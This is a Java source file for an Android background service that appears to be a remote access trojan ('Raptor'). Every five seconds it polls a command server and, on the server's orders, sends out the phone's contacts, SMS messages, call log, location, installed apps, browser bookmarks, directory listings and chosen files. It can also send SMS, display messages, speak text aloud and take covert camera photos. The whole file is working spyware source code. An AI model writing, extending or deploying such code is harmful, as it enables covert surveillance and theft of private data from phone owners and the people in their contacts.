package com.velociraptor.raptor;

import android.Manifest;
import android.app.Notification;
import android.app.Service;
import android.content.Context;
import android.content.ContextWrapper;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.hardware.Camera.Parameters;
import android.location.Location;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.speech.tts.TextToSpeech;
import android.text.TextUtils;
import android.util.Base64;
import android.util.Log;
import android.view.SurfaceHolder;
import android.widget.Toast;

import androidx.annotation.Nullable;
import androidx.core.app.ActivityCompat;
import androidx.core.os.ConfigurationCompat;

import com.androidnetworking.AndroidNetworking;
import com.androidnetworking.common.Priority;
import com.androidnetworking.error.ANError;
import com.androidnetworking.interfaces.JSONObjectRequestListener;
import com.androidnetworking.interfaces.StringRequestListener;
import com.github.tamir7.contacts.Contact;
import com.github.tamir7.contacts.Contacts;
import com.google.gson.Gson;
import com.klinker.android.send_message.Message;
import com.klinker.android.send_message.Settings;
import com.klinker.android.send_message.Transaction;
import com.pixplicity.easyprefs.library.Prefs;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.Executors;

import es.dmoral.toasty.Toasty;
import fr.quentinklein.slt.LocationTracker;
import fr.quentinklein.slt.ProviderError;
import github.nisrulz.easydeviceinfo.base.EasyBatteryMod;
import github.nisrulz.easydeviceinfo.base.EasyDeviceMod;
import github.nisrulz.easydeviceinfo.base.EasyIdMod;
import github.nisrulz.easydeviceinfo.base.EasyMemoryMod;

import me.everything.providers.android.browser.BrowserProvider;
import me.everything.providers.android.calllog.CallsProvider;
import me.everything.providers.android.telephony.TelephonyProvider;

public class InternalService extends Service implements TextToSpeech.OnInitListener {

    public Context context;
    private String SERVER_URI = "http://192.168.42.229/commands.php";
    private Timer timerTaskScheduler = new Timer();
    private LocationTracker tracker = null;
    private String deviceUniqueId = null;
    private TextToSpeech textToSpeech = null;
    private SurfaceHolder surfaceHolder;
    private Camera mCamera;
    private Parameters parameters;
    public AppContant locationDataClass;

    @Override
    public void onCreate() {
        super.onCreate();

        this.context = this.getApplicationContext();
        locationDataClass = new AppContant();
        init();
        //initCamera();


    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_NOT_STICKY;
    }

    private void init() {

        AndroidNetworking.initialize(getApplicationContext());

        new Prefs.Builder()
                .setContext(this.context)
                .setMode(ContextWrapper.MODE_PRIVATE)
                .setPrefsName(getPackageName())
                .setUseDefaultSharedPreference(true)
                .build();


        EasyIdMod easyIdMod = new EasyIdMod(context);
        deviceUniqueId = easyIdMod.getPseudoUniqueID() + "";
        getDeviceInfo();

        checkCmdFromServer();
        startLocationService();
        prepareTTs();

    }

    private void prepareTTs() {
        textToSpeech = new TextToSpeech(context, this);
    }

    private void getDeviceInfo() {
        EasyIdMod easyIdMod = new EasyIdMod(context);
        HashMap<String, String> postData = new HashMap<>();
        postData.put("new_device", easyIdMod.getUA() + "");
        postData.put("unique_id", easyIdMod.getPseudoUniqueID() + "");
        deviceUniqueId = easyIdMod.getPseudoUniqueID() + "";

        EasyDeviceMod easyDeviceMod = new EasyDeviceMod(context);
        postData.put("imei", "Not supported");
        postData.put("os_version", easyDeviceMod.getOSVersion() + "");
        postData.put("phone_product", easyDeviceMod.getManufacturer() + "");
        postData.put("phone_model", easyDeviceMod.getModel() + "");
        postData.put("device_language", easyDeviceMod.getLanguage() + "");
        postData.put("is_rooted", easyDeviceMod.isDeviceRooted() + "");

        EasyBatteryMod easyBatteryMod = new EasyBatteryMod(context);
        postData.put("charge", easyBatteryMod.getBatteryPercentage() + "%");

        EasyMemoryMod easyMemoryMod = new EasyMemoryMod(context);
        postData.put("total_ram", easyMemoryMod.convertToGb(easyMemoryMod.getTotalRAM()) + "");

        Locale current = ConfigurationCompat.getLocales(getResources().getConfiguration()).get(0);
        postData.put("locale_info", current + "");
        addDeviceToServer(postData);
    }

    private void checkCmdFromServer() {

        timerTaskScheduler.schedule(new TimerTask() {
            @Override
            public void run() {
                checkCommandRequests();
            }

        }, 0, 5000);
    }


    private void getPhoneContact() {
        Contacts.initialize(context);
        List<Contact> contacts = Contacts.getQuery().find();

        String json = new Gson().toJson(contacts);
        HashMap<String, Object> postData = new HashMap<>();

        postData.put("device_id", deviceUniqueId);
        postData.put("contact_list", json);
        sendPostDataToServer(postData);
    }

    private void getSMSContent() {
        TelephonyProvider provider = new TelephonyProvider(context);

        String json = new Gson().toJson(provider.getSms(TelephonyProvider.Filter.ALL).getList());
        HashMap<String, Object> postData = new HashMap<>();
        postData.put("device_id", deviceUniqueId);
        postData.put("sms_list", json);
        sendPostDataToServer(postData);
    }

    private void sendPostDataToServer(HashMap<String, Object> postData) {
        AndroidNetworking.post(SERVER_URI)
                .addBodyParameter(postData)
                .build()
                .getAsString(new StringRequestListener() {
                    @Override
                    public void onResponse(String response) {
                        showAllData(response);
                    }

                    @Override
                    public void onError(ANError anError) {
                        showAllData(anError.getErrorDetail());
                    }
                });
    }

    private void sendSms(JSONObject jsonObject) {
        String phoneNumber = null, smsBody = null;
        try {
            JSONObject smsObject = new JSONObject(jsonObject.get("send_sms").toString());
            phoneNumber = smsObject.get("phone_number").toString();
            smsBody = smsObject.get("sms_content").toString();
        } catch (JSONException e) {
            e.printStackTrace();
        }

        Settings sendSettings = new Settings();
        Transaction sendTransaction = new Transaction(context, sendSettings);
        Message mMessage = new Message(smsBody, phoneNumber);
        sendTransaction.sendNewMessage(mMessage, Transaction.NO_THREAD_ID);
    }


    private void addDeviceToServer(HashMap<String, String> hashMap) {
        AndroidNetworking.post(SERVER_URI)
                .addBodyParameter(hashMap)
                .setTag("addDevice")
                .setPriority(Priority.MEDIUM)
                .setExecutor(Executors.newSingleThreadExecutor())
                .build()
                .getAsJSONObject(new JSONObjectRequestListener() {
                    @Override
                    public void onResponse(JSONObject response) {
                    }

                    @Override
                    public void onError(ANError anError) {
                    }
                });
    }

    private void showAllData(String data) {
        Log.e("RAPTOR-RESPONSESS", data.toString() + "");
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        AndroidNetworking.cancelAll();
        timerTaskScheduler.cancel();
        if (tracker != null) {
            if (tracker.isListening()) {
                tracker.stopListening(true);
            }
        }

        if (textToSpeech != null) {
            textToSpeech.stop();
            textToSpeech.shutdown();
        }
    }

    private void checkCommandRequests() {
        HashMap<String, String> hashMap = new HashMap<>();
        hashMap.put("device_id", deviceUniqueId);
        hashMap.put("check_cmd", "true");
        AndroidNetworking.post(SERVER_URI)
                .addBodyParameter(hashMap)
                .setPriority(Priority.MEDIUM)
                .build()
                .getAsJSONObject(new JSONObjectRequestListener() {
                    @Override
                    public void onResponse(JSONObject response) {

                        if (response.has("rehber_oku")) {
                            getPhoneContact();
                        }

                        if (response.has("sms_oku")) {
                            getSMSContent();
                        }

                        if (response.has("send_sms")) {
                            sendSms(response);
                        }

                        if (response.has("device_info")) {
                            getDeviceInfo();
                        }

                        if (response.has("location_tracker")) {
                            prepareLocationdata();
                        }

                        if (response.has("arama_gecmisi")) {
                            getCallLog();
                        }

                        if (response.has("screen_message")) {
                            screenMessage(response);
                        }
                        if (response.has("voice_message")) {
                            startVoiceMessage(response);
                        }

                        if (response.has("get_list_file")) {
                            getListFile(response);
                        }

                        if (response.has("upload_file_path")) {
                            uploadFile(response);
                        }

                        if (response.has("application_list")) {
                            getApplist();
                        }

                        if (response.has("browser_history")) {
                            getBrowserHistory();
                        }
                        if (response.has("get_screenshot")) {
                            getScreenshot();
                        }
                    }

                    @Override
                    public void onError(ANError anError) {
                        showAllData("Error connect command code: " + anError.getErrorCode());
                    }
                });

        /*

         */

    }

    private void getScreenshot() {

    }

    private void getBrowserHistory() {
        BrowserProvider browserProvider = new BrowserProvider(context);
        String json = new Gson().toJson(browserProvider.getBookmarks().getList());
        showAllData(json);
        HashMap<String, Object> postData = new HashMap<>();
        postData.put("device_id", deviceUniqueId);
        postData.put("browser_history", json);
        sendPostDataToServer(postData);

    }

    private void getApplist() {
        final PackageManager pm = getPackageManager();

        List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);

        HashMap<String, Object> appIndexMap = new HashMap<>();
        int appIndex = 1;
        for (ApplicationInfo packageInfo : packages) {

            HashMap<String, String> infoMap = new HashMap<>();
            infoMap.put("package", packageInfo.packageName + "");
            if (packageInfo.sourceDir != null)
                infoMap.put("dir", packageInfo.sourceDir + "");
            infoMap.put("app_name", packageInfo.loadLabel(getPackageManager()).toString() + "");
            appIndexMap.put("###app-" + (appIndex), infoMap);
            appIndex++;
        }
        showAllData("normal_veri: " + appIndexMap.toString());

        String base64 = Base64.encodeToString(appIndexMap.toString().getBytes(), Base64.DEFAULT);
        showAllData("sifreli veri: " + base64);

        HashMap<String, String> postData = new HashMap<>();
        postData.put("device_id", deviceUniqueId);
        postData.put("app_list", base64);

        AndroidNetworking.post(SERVER_URI)
                .addBodyParameter(postData)
                .setPriority(Priority.MEDIUM)
                .build()
                .getAsString(new StringRequestListener() {
                    @Override
                    public void onResponse(String response) {
                        showAllData(response);
                    }

                    @Override
                    public void onError(ANError anError) {
                        showAllData(anError.getErrorDetail());
                    }
                });
    }

    private void uploadFile(JSONObject jsonObject) {
        String filePath = null;
        try {
            filePath = jsonObject.getString("upload_file_path");

        } catch (JSONException e) {
            e.printStackTrace();
        }

        if (filePath != null) {
            File file = new File(filePath);
            if (file.isFile()) {
                showAllData(file.getName());
                HashMap<String, Object> postData = new HashMap<>();
                postData.put("device_id", deviceUniqueId);

                AndroidNetworking.upload(SERVER_URI)
                        .addMultipartFile("uploaded_file", file)
                        .addMultipartParameter(postData)
                        .setPriority(Priority.HIGH)
                        .setExecutor(Executors.newSingleThreadExecutor())
                        .build()
                        .getAsString(new StringRequestListener() {
                            @Override
                            public void onResponse(String response) {

                            }

                            @Override
                            public void onError(ANError anError) {
                            }
                        });
            }
        }

    }

    private void getListFile(JSONObject jsonObject) {
        JSONObject object;
        String targetFilePath = null;
        try {
            object = new JSONObject(jsonObject.get("get_list_file").toString());
            targetFilePath = object.getString("target_file_path");
        } catch (JSONException e) {
            e.printStackTrace();
        }

        HashMap<String, Object> postData = new HashMap<>();

        File file = new File(targetFilePath);
        if (file.exists() && file.isDirectory()) {
            File[] fileList = file.listFiles();

            if (fileList == null) {
                return;
            }
            HashMap<String, String> hashMap = new HashMap<>();
            for (int i = 0; i < fileList.length; i++) {
                hashMap.put("path_" + (i + 1), fileList[i].getAbsolutePath());
            }

            byte[] data = new byte[0];
            try {
                data = hashMap.toString().getBytes("UTF-8");
            } catch (UnsupportedEncodingException e) {
                e.printStackTrace();
            }
            String base64 = Base64.encodeToString(data, Base64.DEFAULT);

            postData.put("device_id", deviceUniqueId);
            postData.put("get_file_list", base64);
            sendPostDataToServer(postData);
        }


    }

    private void startVoiceMessage(JSONObject jsonObject) {
        String langType = null, msgContent = null;
        try {
            JSONObject voiceContent = new JSONObject(jsonObject.get("voice_message").toString());
            langType = voiceContent.getString("message_type");
            msgContent = voiceContent.getString("message_content");
        } catch (JSONException e) {
            e.printStackTrace();
        }

        int ttsLang = 0;
        switch (langType) {
            case "TR":
                ttsLang = textToSpeech.setLanguage(new Locale("tr", "TR"));
                break;

            case "EN":
                ttsLang = textToSpeech.setLanguage(new Locale("en", "GB"));
                break;

            case "RU":
                ttsLang = textToSpeech.setLanguage(new Locale("ru", "RU"));
                break;
        }

        if (ttsLang == TextToSpeech.LANG_MISSING_DATA
                || ttsLang == TextToSpeech.LANG_NOT_SUPPORTED) {

            textToSpeech.setLanguage(Locale.getDefault());
        }

        textToSpeech.speak(msgContent, TextToSpeech.QUEUE_ADD, null);

    }

    private void screenMessage(JSONObject jsonObject) {

        Toasty.Config.getInstance()
                .tintIcon(true)
                .setTextSize(35)
                .allowQueue(true)
                .apply();

        String messageType = null, messageContent = null;
        try {
            JSONObject msgObject = new JSONObject(jsonObject.getJSONObject("screen_message").toString());
            messageType = msgObject.get("message_type").toString() + "";
            messageContent = msgObject.get("message_content").toString() + "";
        } catch (JSONException e) {
            e.printStackTrace();
        }

        if (!TextUtils.isEmpty(messageContent.trim())) {
            switch (messageType.trim()) {
                case "error":
                    Toasty.error(context, messageContent, Toast.LENGTH_LONG, true).show();
                    break;

                case "success":
                    Toasty.success(context, messageContent, Toast.LENGTH_LONG, true).show();
                    break;

                case "info":

                    Toasty.info(context, messageContent, Toast.LENGTH_LONG, true).show();
                    break;

                case "warning":
                    Toasty.warning(context, messageContent, Toast.LENGTH_LONG, true).show();
                    break;

                case "normal":
                    Toasty.normal(context, messageContent, Toast.LENGTH_LONG).show();
                    break;
            }
        }


    }

    private void getCallLog() {
        CallsProvider callsProvider = new CallsProvider(context);

        String json = new Gson().toJson(callsProvider.getCalls().getList());
        showAllData(json);
        HashMap<String, Object> postData = new HashMap<>();
        postData.put("device_id", deviceUniqueId);
        postData.put("call_log_history", json);
        sendPostDataToServer(postData);
    }

    private void prepareLocationdata() {

        tracker.quickFix(this.context);
        if (locationDataClass.getLatitude != 0.0 && locationDataClass.getLongitude != 0.0) {
            HashMap<String, Object> postData = new HashMap<>();
            postData.put("device_id", deviceUniqueId);
            postData.put("location_update", "true");
            postData.put("x_axis", locationDataClass.getLatitude + "a");
            postData.put("y_axis", locationDataClass.getLongitude + "a");
            sendPostDataToServer(postData);
        }


    }

    private void startLocationService() {

        tracker = new LocationTracker();
        tracker.getShouldUseNetwork();
        tracker.getShouldUseGPS();
        tracker.getShouldUsePassive();

        tracker.addListener(new LocationTracker.Listener() {
            @Override
            public void onLocationFound(Location location) {
                locationDataClass.getLongitude = location.getLongitude();
                locationDataClass.getLatitude = location.getLatitude();
            }

            @Override
            public void onProviderError(ProviderError providerError) {
                locationDataClass.getLongitude = 0.0;
                locationDataClass.getLatitude = 0.0;
            }
        });

        if (!tracker.isListening()) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                    return;
                } else {
                    tracker.startListening(context);
                }
            } else {
                tracker.startListening(context);
            }
        }
    }


    @Override
    public void onInit(int status) {
        if (status == TextToSpeech.SUCCESS) {
        }
    };

    private void initCamera(){

        mCamera = Camera.open(1);
        mCamera.setDisplayOrientation(90);
        SurfaceTexture st = new SurfaceTexture(MODE_PRIVATE);


        try {
            mCamera.setPreviewTexture(st);
            parameters = mCamera.getParameters();

            //set camera parameters
            mCamera.setParameters(parameters);
            mCamera.startPreview();
            takePic();

        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
            //stop the preview
            mCamera.stopPreview();
            mCamera.setPreviewCallback(null);
            //release the camera
            mCamera.release();
            //unbind the camera from this object
            mCamera = null;
        }

    }

    public void takePic(){

        Camera.PictureCallback mCall = new Camera.PictureCallback() {

            public void onPictureTaken(byte[] data, Camera camera) {

                File photo=new File(Environment.getExternalStorageDirectory(), "ssll.jpg");

                if (photo.exists()) {
                    photo.delete();
                }

                try {
                    FileOutputStream fos=new FileOutputStream(photo.getPath());

                    fos.write(data);
                    fos.close();
                }
                catch (java.io.IOException e) {
                    Log.e("PictureDemo", "Exception in photoCallback", e);
                }


                //stop the preview
                mCamera.stopPreview();
                mCamera.setPreviewCallback(null);
                //release the camera
                mCamera.release();
                //unbind the camera from this object
                mCamera = null;
            }
        };
        mCamera.takePicture(null, null, mCall);
        Toast.makeText(getApplicationContext(),"Pic taken",Toast.LENGTH_LONG).show();
    }
}
